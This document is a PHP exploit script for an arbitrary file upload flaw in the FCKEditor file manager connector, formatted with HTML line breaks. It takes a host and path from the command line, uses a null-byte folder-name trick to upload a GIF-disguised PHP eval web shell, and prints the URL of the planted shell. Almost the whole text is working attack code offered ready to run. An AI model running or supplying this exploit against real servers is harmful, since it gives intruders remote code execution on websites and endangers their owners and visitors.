<?
error_reporting(0);<br>
set_time_limit(0);<br>
ini_set("default_socket_timeout", 5);define(STDIN, fopen("php://stdin", "r"));<br>
$match = array();function http_send($host, $packet)<br>
{<br>
 $sock = fsockopen($host, 80);<br>
 while (!$sock)<br>
 {<br>
 print "\n[-] No response from {$host}:80 Trying again...";<br>
 $sock = fsockopen($host, 80);<br>
 }<br>
 fputs($sock, $packet);<br>
 while (!feof($sock)) $resp .= fread($sock, 1024);<br>
 fclose($sock);<br>
 print $resp;<br>
 return $resp;<br>
}function connector_response($html)<br>
{<br>
 global $match;<br>
 return (preg_match("/OnUploadCompleted\((\d),\"(.*)\"\)/", $html, $match) && in_array($match[1], array(0, 201)));<br>
}print "\n+------------------------------------------------------------------+";<br>
print "\n| FCKEditor Servelet Arbitrary File Upload Exploit by Wolegequ     |";<br>
print "\n+------------------------------------------------------------------+\n";if ($argc < 3)<br>
{<br>
 print "\nUsage......: php $argv[0] host path\n";<br>
 print "\nExample....: php $argv[0] localhost /\n";<br>
 print "\nExample....: php $argv[0] localhost /FCKEditor/\n";die();<br>
}$host = $argv[1];<br>
$path = ereg_replace("(/){2,}", "/", $argv[2]);$filename  = "fvck.gif";<br>
$foldername = "fuck.php%00.gif";<br>
$connector = "editor/filemanager/connectors/php/connector.php";$payload  = "-----------------------------265001916915724\r\n";<br>
$payload .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"{$filename}\"\r\n";<br>
$payload .= "Content-Type:  image/jpeg\r\n\r\n";<br>
$payload .= 'GIF89a'."\r\n".'<?php eval($_POST[a]) ?>'."\n";<br>
$payload .= "-----------------------------265001916915724--\r\n";$packet = "POST {$path}{$connector}?Command=FileUpload&Type=Image&CurrentFolder=".$foldername." HTTP/1.0\r\n";<br>
//print $packet;<br>
$packet .= "Host: {$host}\r\n";$packet .= "Content-Type: multipart/form-data; boundary=---------------------------265001916915724\r\n";<br>
$packet .= "Content-Length: ".strlen($payload)."\r\n";<br>
$packet .= "Connection: close\r\n\r\n";<br>
$packet .= $payload;print $packet;if (!connector_response(http_send($host, $packet))) die("\n[-] Upload failed!\n");<br>
else print "\n[-] Job done! try http://${host}/$match[2] \n";
?>